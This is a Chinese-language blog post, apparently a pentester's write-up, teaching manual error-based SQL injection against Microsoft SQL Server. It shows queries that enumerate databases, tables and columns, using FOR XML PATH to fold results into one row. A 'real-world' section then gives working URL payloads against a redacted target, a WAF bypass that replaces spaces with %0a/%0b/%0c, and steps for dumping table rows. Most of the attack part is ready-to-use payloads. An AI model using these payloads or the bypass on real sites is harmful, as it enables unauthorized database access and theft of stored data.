---
layout: post
title:  "SQL-Server-SQL-Inject"
---
---
## 背景
某次xx，遇到了一处SQL Server 的注入点，由于平时碰到的SQL Server数据库比较少，所以本文将详细讲解SQL Server的手工注入及其技巧。

---

## 思路
一般SQL注入都是先查库名再查表名最后查字段，查到字段之后就可以查到里面的数据了。
那么我们先查第一个库名:
```sql
SELECT top 1 Name FROM Master..SysDatabases
```
返回
<code>master</code>

这里返回的第一个数据库master是系统库，SQL Server总共有五个系统数据库，其说明如下:   

| 系统数据库    | 说明|
|:----------|:---------------|
|master    |记录SQL Server 系统的所有系统级信息的数据库|
|msdb|SQL Server 代理用来安排警报和作业以及记录操作员信息的数据库。 msdb 还包含历史记录表，例如备份和还原历史记录表|
|model|在SQL Server 实例上为所有数据库创建的模板。|
|Resource|包含 SQL Server 2005 或更高版本附带的所有系统对象副本的只读数据库|
|tempdb|用于保存临时或中间结果集的工作空间。 每次启动 SQL Server 实例时都会重新创建此数据库。 服务器实例关闭时，将永久删除 tempdb 中的所有数据。|   

摘自
https://docs.microsoft.com/zh-cn/previous-versions/sql/sql-server-2012/ms190190(v=sql.110)


那么我们继续查第二个库，在SQL Server中跟MYSQL不同，如果是在MYSQL中我们可以用 limit 去查，在SQL Server中需要加 not in ('库名1','库名2',.....)去排除里面的集合

第二个库:
```sql
SELECT top 1 Name FROM Master..SysDatabases where name not in ('master')
```
返回
```sql
model
```
那么以此类推，我们就可以得到所有库名。
但是如果后面的集合越来越大，这样去查并不是最有效率的，虽然说查库名可能没有感觉，但如果是表名呢？ 这样查到后面的集合无疑是越来越大，当然，我们在数据库中可以更改 top 后面的数值去查询多条:
```sql
SELECT top 5 Name FROM Master..SysDatabases
```
返回:

||Name|  
|---|---|  
|1|master|  
|2|tempdb|  
|3|model|  
|4|msdb|  
|5|xxx|  

实战的情况往往是不行的，因为用 top 去查返回的会是多行数据，而一般的注入点返回的只是单行，用这种方法返回的多个数据无法显示在单行，所以我们不能用这种方法去查。
在参考了倾旋的文章:
https://payloads.online/archivers/2020-03-02/3#stuff%E4%B8%8Exml-path

还有国外的一篇文章:
https://www.sqlshack.com/for-xml-path-clause-in-sql-server/

发现了可以用 FOR XML PATH将SQL语句返回的多行数据合并成单行  
关于FOR XML PATH的文档：
https://docs.microsoft.com/zh-cn/sql/relational-databases/xml/for-xml-sql-server?view=sql-server-ver15  

>SELECT 查询将结果作为行集返回。 （可选操作）您可以通过在 SQL 查询中指定 FOR XML 子句，从而将该查询的正式结果作为 XML 来检索。 FOR XML 子句可以用在顶级查询和子查询中。 顶级 FOR XML 子句只能用在 SELECT 语句中。 而在子查询中，FOR XML 可以用在 INSERT、UPDATE 和 DELETE 语句中。 FOR XML 还可以用在赋值语句中。  

其中FOR XML有四种模式分别为
- RAW
- AUTO
- EXPLICIT
- PATH

这里我们可以用较为简单的PATH模式
`SELECT  Name from Master..SysDatabases  FOR  XML PATH`
返回
```sql
<row><Name>master</Name></row><row><Name>tempdb</Name></row><row><Name>model</Name></row><row><Name>msdb</Name></row>...
```

我们发现这里返回的数据变成了单行，现在我们要去掉row标签
```sql
SELECT  Name from Master..SysDatabases  FOR  XML PATH('')
```
返回
```sql
<Name>master</Name><Name>tempdb</Name><Name>model</Name>....
```
虽然说已经返回单行数据，但是有很多标签看着还是不舒服，参考了倾旋的方法，用 '，' 进行拼接，于是我们可以:
```sql
SELECT name+',' FROM(SELECT name from Master..SysDatabases) a  FOR  XML PATH('')
```
返回
```sql
master,tempdb,model,msdb,...
```
这样会更方便查看。
关于STUFF函数：
https://docs.microsoft.com/zh-cn/sql/t-sql/functions/stuff-transact-sql?view=sql-server-ver15

也可以通过STUFF函数进行拼接
```sql
SELECT STUFF((SELECT name+',' FROM(SELECT name from Master..SysDatabases) a  FOR  XML PATH('') ), 1,0, '')
```
返回和之前的是一样的，于是我在实测中便不采用这种方法。

---
## 实战

手工发现注入点,单引号报错:
```html
xxx.com?abc=1'
```

查版本：
```html
xxx.com?abc=a' and 1=(select @@version) and '1'='1
```
爆了版本的错误

于是接着注库名
```html
xxx.com?abc=a' and 1=(SELECT name+',' FROM(SELECT name from Master..SysDatabases)a FOR  XML PATH('')) and '1'='1
```
然后被waf给拦截了..
SQL Server数据库不像MYSQL有內联注释可以绕过很多软waf，所以考虑将payload变形，首先想到的是将特殊符号(单引号)进行urlencode，结果发现还是被拦截了，接着考虑将payload进行base64编码，结果发现这个注入点传递到数据库不支持base64编码。最后我将空格换成%0a,%0b，%0c等，成功绕过。
```html
xxx.com?abc=a%27%0aand%0a1=(SELECT%0aname%2b%27,%27%0aFROM(SELECT%0aname%0afrom%0aMaster..SysDatabases)%0a%0aFOR%0a%0aXML%0aPATH(%27%27))a%0aand%0a%271%27=%271
```
成功返回库名
接着开始注表名
```html
xxx.com?abc=a%27%0aand%0a1=(SELECT%0aname%2b%27,%27%0aFROM(SELECT%0aname%0afrom%0axxx.sys.all_objects%0awhere%0atype=%27U%27)a%0aFOR%0a%0aXML%0aPATH(%27%27))%0aand%0a%271%27=%271
```
成功返回表名

注字段名的语句，table_name指的是表名
```html
select name+',' from (SELECT Name FROM SysColumns WHERE id=Object_Id('table_name'))a for xml path('')
```
那么运用到实战:
```html
xxx.com?abc=a%27%0aand%0a1=(select%0aname%2b%27,%27%0afrom%0a(SELECT%0aName%0aFROM%0aSysColumns%0aWHERE%0aid=Object_Id(%27table_name%27))a%0afor%0axml%0apath(%27%27))%0aand%0a%271%27=%271
```


接着注字段的值
```html
SELECT column_name+',' FROM(SELECT column_name from dbo.table_name)a FOR  XML PATH('')
```
这里column_name指的是字段名,table_name指的是表名   <br>
运用到实战
```html
xxx.com?abc=a%27%0aand%0a1=(SELECT%0atop%0a5%0acolumn_name%2b%27,%27%0aFROM(SELECT%0acolumn_name%0afrom%0adbo.table_name)a%0aFOR%0a%0aXML%0aPATH(%27%27))%0aand%0a%271%27=%271
```
成功注出前五条数据   <br>


---
